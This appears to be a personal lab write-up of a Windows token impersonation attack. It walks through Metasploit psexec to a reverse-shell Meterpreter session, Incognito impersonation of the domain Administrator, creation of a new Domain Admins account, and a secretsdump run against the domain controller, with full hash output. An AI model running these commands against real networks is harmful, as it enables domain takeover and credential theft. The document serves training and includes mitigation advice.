# Token Impersonation Attack

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:** Privilege Escalation  
**Difficulty:** Easy  
**Tools:** Metasploit Framework, PsExec, Meterpreter, Incognito, secretsdump.py

## Table of Contents

- [Introduction](#introduction)
- [Lab Setup](#lab-setup)
- [Attack Flow](#attack-flow)
- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
  - [1.1 Start Metasploit](#step-11-starting-metasploit)
  - [1.2 Search for psexec](#step-12-now-search-for-psexec)
  - [1.3 Use exploit/windows/smb/psexec](#step-13-use-exploitwindowssmbpsexec)
  - [1.4 View module options](#step-14-display-all-available-settings-for-a-metasploit-module)
  - [1.5 Set required options](#step-15-setting-required-options)
  - [1.6 Get Meterpreter session](#step-16-get-meterpreter-session)
- [Step 2 - Check UID](#step-2-check-uid)
- [Step 3 - Load Incognito](#step-3---load-incognito)
- [Step 4 - List Available Tokens](#step-4---list-available-tokens)
- [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
- [Step 6 - Verify Access](#step-6---verify-access)
  - [6.1 Create Domain User](#step-61---create-a-domain-user)
  - [6.2 Add User to Domain Admins Group](#step-62---add-a-user-to-the-domain-admins-group)
- [Step 7 - Dump All Hashes](#step-7---dump-all-hashes)
- [Key Takeaways](#key-takeaways)
- [Mitigation](#mitigation)

## Introduction

In this lab, I practiced a Windows Token Impersonation attack.

Windows creates an access token whenever a user logs in. The token contains information about that user's permissions and privileges.

If a privileged token is available on a compromised machine, it may be possible to impersonate that token and perform actions as that user.

The goal of this lab was to identify available tokens and impersonate a privileged account from an existing Meterpreter session.

## lab Setup

```
| Machine             | Role              |   Ip          |
| ------------------- | ----------------- |---------------|
| Kali Linux          | Attacker          | 192.168.5.128 |
| Windows 10          | Victim            | 192.168.5.142 |
| Windows Server 2019 | Domain Controller | 192.168.5.134 |
```

Before starting the attack, I already had the following valid domain credentials:

- Domain: `readteambd.local`
- User: `rahimkhan`
- Pass: `Password1`

## Attack Flow

```
Gain Initial Access
        │
        ▼
List Available Tokens
        │
        ▼
Find Administrator Token
        │
        ▼
Impersonate Token
        │
        ▼
Gain Elevated Privileges
```

## Step 1 - Get a Meterpreter Session

### 1.1 Start Metasploit

First, I started the Metasploit Framework in quiet mode.

```bash
msfconsole -q
```

**Breakdown:**

* `msfconsole` starts the Metasploit Framework console.
* The `-q` flag starts Metasploit in quiet mode.
* This hides the startup banner and extra messages, giving a cleaner terminal output.

**Output:**

```text
msf6 >
```
<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.1.png" width="600">
</p>

The quiet mode does not change how Metasploit works. It only reduces the amount of information displayed when the console starts.

### Step 1.2: Search for the `PsExec` Module

Next, I searched for the available PsExec modules.

```bash
search psexec
```

The output shows several modules related to PsExec. For this lab, I used `exploit/windows/smb/psexec.`

**Output:**

```
Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   4     \_ target: Automatic                       .                .          .      .
   5     \_ target: PowerShell                      .                .          .      .
   6     \_ target: Native upload                   .                .          .      .
   7     \_ target: MOF upload                      .                .          .      .
   8     \_ target: Command                         .                .          .      .
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10    \_ target: Automatic                       .                .          .      .
   11    \_ target: PowerShell                      .                .          .      .
   12    \_ target: Native upload                   .                .          .      .
   13    \_ target: MOF upload                      .                .          .      .
   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   17    \_ AKA: ETERNALBLUE                        .                .          .      .
   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   22    \_ AKA: ETERNALBLUE                        .                .          .      .
   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   25    \_ target: Automatic                       .                .          .      .
   26    \_ target: PowerShell                      .                .          .      .
   27    \_ target: Native upload                   .                .          .      .
   28    \_ target: MOF upload                      .                .          .      .
   29    \_ target: Command                         .                .          .      .
   30  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   31  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   32  encoder/x86/service                          .                manual     No     Register Service
   33  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   34  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
   35    \_ target: Automatic                       .                .          .      .
   36    \_ target: Native upload                   .                .          .      .
   37  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   ```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.2.png" width="600">
</p>

### Step 1.3: Use the PsExec Module

I selected the exploit/windows/smb/psexec module to get a Meterpreter session on the target machine.

```bash
use exploit/windows/smb/psexec
```

**Output:**

```text
msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                                                      
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST                                                                                                       
msf exploit(windows/smb/psexec) >    
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.3.png" width="600">
</p>

This module uses valid Windows credentials to execute a payload over SMB and open a Meterpreter session on the target.

### Step 1.4: View Module Options

Next, I checked the module options to see which settings needed to be configured.

```bash
msf exploit(windows/smb/psexec) > options
```

The `options` command is used to display all available settings for a Metasploit module.

**Output:**

```
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):
   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share

   Used when connecting via an existing SESSION:
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on

   Used when making a new connection via RHOSTS:
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.5.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic
View the full module info with the info, or info -d command.
```
<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.4.png" width="600">
</p>

### Step 1.5: Setting Required Options

Before running the exploit, I set the target machine and login details in Metasploit.

```bash
set RHOSTS 192.168.5.142
set SMBUSER rahimkhan
set SMBPASS Password1
set SMBDomain readteambd.local
```

**What these mean:**

* **RHOSTS** → Target machine IP address
* **SMBUSER** → Username used to log in
* **SMBPASS** → Password or NTLM hash for authentication
* **SMBDomain** → Domain name of the target environment

**Output:**

```text
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
RHOSTS => 192.168.5.142
msf exploit(windows/smb/psexec) > set Interrupt: use the 'exit' command to quit
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
RHOSTS => 192.168.5.142
msf exploit(windows/smb/psexec) > set SMBUser rahimkhan
SMBUser => rahimkhan
msf exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf exploit(windows/smb/psexec) > set SMBDomain readteambd.local
SMBDomain => readteambd.local
msf exploit(windows/smb/psexec) >
```
<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.5.png" width="600">
</p>

### Step 1.6: Get Meterpreter Session

After setting everything, I ran the exploit to get a session on the target machine.

```bash
run
```

**Output:**

```text
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.5.128:4444 
[*] 192.168.5.142:445 - Connecting to the server...
[*] 192.168.5.142:445 - Authenticating to 192.168.5.142:445|readteambd.local as user 'rahimkhan'...
[*] 192.168.5.142:445 - Selecting PowerShell target
[*] 192.168.5.142:445 - Executing the payload...
[+] 192.168.5.142:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (196678 bytes) to 192.168.5.142
[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.142:59364) at 2026-06-01 02:42:04 -0400

meterpreter >
```
After this, I successfully got a Meterpreter session on the target system.

<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.6.png" width="600">
</p>


## Step 2: Check uid

After getting a Meterpreter session on the Windows machine, I checked which user I was running as.

```bash
getuid
```

**Output:**

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step2-1.png" width="600">
</p>

## Step 3 - Load Incognito

The Incognito extension allows token enumeration and impersonation.

```bash
load incognito
```

**Output:**

```text
meterpreter > load incognito
Loading extension incognito...Success.
```

## Step 4 - List Available Tokens

```bash
meterpreter > list_tokens -u
```

**Output:**

```text
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
READTEAMBD\Administrator
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step3.png" width="600">
</p>

## Step 5 - Impersonate the Administrator Token

```bash
impersonate_token "READTEAMBD\\Administrator"
```

**Output:**

```text
meterpreter > impersonate_token READTEAMBD\\Administrator
[+] Delegation token available
[+] Successfully impersonated user READTEAMBD\Administrator
```

## Step 6 - Verify Access

```bash
getuid
```

**Output:**

```text
meterpreter > getuid
Server username: READTEAMBD\administrator
```

The session was now running with Administrator privileges.

## Step 6 - Add new user

```bash
shell
```

**Output:**

```text
meterpreter > shell
Process 2236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Step 6.1 - Create a Domain User

The following command creates a new domain user named `testuser` with the password `@testuser#!`:

```bash
net user test @shahin123#! /add /domain
```

### Command Breakdown

- `net user` – Used to manage user accounts in Windows.
- `test` – The username of the new account.
- `@shahin123#!` – The password assigned to the account.
- `/add` – Creates a new user account.
- `/domain` – Performs the action on the Active Directory domain instead of the local machine.

**Output:**

```
C:\Windows\system32>net user test @shahin123#! /add /domain
net user test @shahin123#! /add /domain
The request will be processed at a domain controller for domain READTEAMBD.local.

The command completed successfully.
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step6.png" width="600">
</p>

## Step 6.2 - Add a User to the Domain Admins Group

The following command attempts to add the user `test` to the `Domain Admins` group:

```bash
net group "Domain Admins" test /ADD /DOMAIN
```

### Command Breakdown

- `net` – Windows built-in CLI tool for managing network/domain resources.
- `group` – Specifies you're working with a global group (domain-level group).
- `Domain Admins` – The target group name (quotes needed because of the space).
- `test` – The username being added to the group.
- `/ADD` – The action — adds the user to the group.


**Output:**

```
C:\Windows\system32>net group "Domain Admins" test /ADD /DOMAIN
net group "Domain Admins" test /ADD /DOMAIN
The request will be processed at a domain controller for domain READTEAMBD.local.

The command completed successfully.
```

## Step 7 - Dump All Hashes

```bash
secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
```

### Command Breakdown

- `secretsdump.py` – Impacket script that remotely dumps password hashes and secrets from a Windows/AD target.
- `readteambd.local` – Domain
- `test` - user name
- `@shahin123#!` - user password
- `@192.168.5.134` - dc ip

**Output:**

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
READTEAMBD\REDTEAMBD-DC$:aes256-cts-hmac-sha1-96:2373e4edd49e2cd50d82138c018e93b1ee56682285b57252b2a007fc19e9623c
READTEAMBD\REDTEAMBD-DC$:aes128-cts-hmac-sha1-96:20d614ac27a44a1a2aeb2c2866c5bbbb
READTEAMBD\REDTEAMBD-DC$:des-cbc-md5:e93bb615455edafb
READTEAMBD\REDTEAMBD-DC$:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1489248803a2447a36be0a3277c4bbea31e58dcc
dpapi_userkey:0x658a3345d9bbc292356eab42db8971268701f757
[*] NL$KM 
 0000   52 1A 7A 78 A2 BD A4 13  1C 1E 21 49 11 7B B5 91   R.zx......!I.{..
 0010   41 92 FC 6C BB 7D 4C B8  BC 06 BB EA CD 4D 99 E8   A..l.}L......M..
 0020   45 6F 6F 43 2A 4E E7 8A  C2 DE 7B 6D DC DC E7 02   EooC*N....{m....
 0030   9D 52 60 64 62 65 C1 25  03 88 BD B4 88 C6 E6 C5   .R`dbe.%........
NL$KM:521a7a78a2bda4131c1e2149117bb5914192fc6cbb7d4cb8bc06bbeacd4d99e8456f6f432a4ee78ac2de7b6ddcdce7029d5260646265c1250388bdb488c6e6c5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f8156b8f557baae7cd069ac724e1959:::
READTEAMBD.local\shahin:1105:aad3b435b51404eeaad3b435b51404ee:bcb3cd5313f9537196a11fdb9fad2ac9:::
READTEAMBD.local\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
READTEAMBD.local\rahimkhan:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
READTEAMBD.local\karimkhan:1110:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
test2:1115:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
test:1117:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
REDTEAMBD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
VICTIM-1$:1111:aad3b435b51404eeaad3b435b51404ee:af96b7d9f1e7c7d5a983c634b7db3a92:::
VICTIM-2$:1112:aad3b435b51404eeaad3b435b51404ee:4286814f1a9fcc086127d115a63621c7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:11229cb90f90de06b490fddf1547b22c9e18e085a60747aca3f3a6e48f402f4c
Administrator:aes128-cts-hmac-sha1-96:b529d2369b3c803fd52fff98c6abc5c4
Administrator:des-cbc-md5:202abffea2a15b86
krbtgt:aes256-cts-hmac-sha1-96:29bd3b3755e50fdec690dce37e2ff12b50b8aef064a18e865a575fe56576bbd4
krbtgt:aes128-cts-hmac-sha1-96:106df1d21a66d2eeae03573c53fe4107
krbtgt:des-cbc-md5:572cd631329bdaf8
READTEAMBD.local\shahin:aes256-cts-hmac-sha1-96:21562f5f21641cf8eaa09e07c728110b0d5d05f152b278aa776569c6dc8784c9
READTEAMBD.local\shahin:aes128-cts-hmac-sha1-96:ede4573cedfd8cdf0e069bd6e87f9fed
READTEAMBD.local\shahin:des-cbc-md5:9b58c483ad37b307
READTEAMBD.local\sqlservice:aes256-cts-hmac-sha1-96:b33f27e24d00d4df49ed7ae0288d148f2db992c2e59c6d5a70d52adb9ba08ad8
READTEAMBD.local\sqlservice:aes128-cts-hmac-sha1-96:71f693c2a57c772f1cab00537701cc19
READTEAMBD.local\sqlservice:des-cbc-md5:bfd9e0d55ea86b1a
READTEAMBD.local\rahimkhan:aes256-cts-hmac-sha1-96:a5c93fa6eb16c9a14c00d724a9ec629c095d72dcdfdaaff9a402888040fc789b
READTEAMBD.local\rahimkhan:aes128-cts-hmac-sha1-96:a13f44b8df15afb92d8daa0dd090d6b7
READTEAMBD.local\rahimkhan:des-cbc-md5:0162750ec70862c4
READTEAMBD.local\karimkhan:aes256-cts-hmac-sha1-96:91c22ad68031881bba444a9b574dbe6910b34b74d17c7b336f571e5ffe378746
READTEAMBD.local\karimkhan:aes128-cts-hmac-sha1-96:9fcf640bc4481a0f54cfe5dd6484c801
READTEAMBD.local\karimkhan:des-cbc-md5:76cd582a29dccece
test2:aes256-cts-hmac-sha1-96:15b0a3fd636086443cb04ff4e9a4f2fce721360af8b4034f4712239641b76bfb
test2:aes128-cts-hmac-sha1-96:a1fd53423759c711cd6b7f81ab596aa3
test2:des-cbc-md5:98461c1f947c978c
test:aes256-cts-hmac-sha1-96:a7309d070aadb025a17b0f126dc627c44486e5278fdb431638879b46b1fed9c7
test:aes128-cts-hmac-sha1-96:c110e4ca65344d639af67fe72b53230e
test:des-cbc-md5:4558c18a5107207a
REDTEAMBD-DC$:aes256-cts-hmac-sha1-96:2373e4edd49e2cd50d82138c018e93b1ee56682285b57252b2a007fc19e9623c
REDTEAMBD-DC$:aes128-cts-hmac-sha1-96:20d614ac27a44a1a2aeb2c2866c5bbbb
REDTEAMBD-DC$:des-cbc-md5:b5a2f2fdabf27ad5
VICTIM-1$:aes256-cts-hmac-sha1-96:309fc79973c1ca1460b3dad9deb74ab87ebdf81ae5c833461084d755efb1695e
VICTIM-1$:aes128-cts-hmac-sha1-96:2cc7c1753f6ab893c73633969b241975
VICTIM-1$:des-cbc-md5:b675ce1083ad4a5e
VICTIM-2$:aes256-cts-hmac-sha1-96:8decb9f00c39233817ca1a32114dd607ed4bec34e22a3efea30e73da529ca487
VICTIM-2$:aes128-cts-hmac-sha1-96:7fc817241159420e47632ca236d71258
VICTIM-2$:des-cbc-md5:7ac1431fd0f20298
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step7.png" width="600">
</p>


# Key Takeaways

- Windows creates an access token when a user logs in.
- Access tokens contain the user's permissions.
- A privileged token can sometimes be reused without knowing the user's password.
- Token impersonation is a common post-exploitation technique.
- Monitoring privileged activity can help detect this behavior.

# Mitigation

- Follow the principle of least privilege
- Limit use of privileged accounts
- Review accounts with SeImpersonatePrivilege
- Enable Credential Guard
- Monitor suspicious process activity

# References

### MITRE ATT&CK

- [Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/)

### Microsoft Documentation

- [Access Tokens Documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

- [Credential Guard Documentation](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)

### Additional Resources

- [Windows Privileges Documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges)

- [Security Auditing Overview](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview)

### Tools Used During Testing

- [Metasploit Framework](https://www.metasploit.com/)

- [Meterpreter Documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/)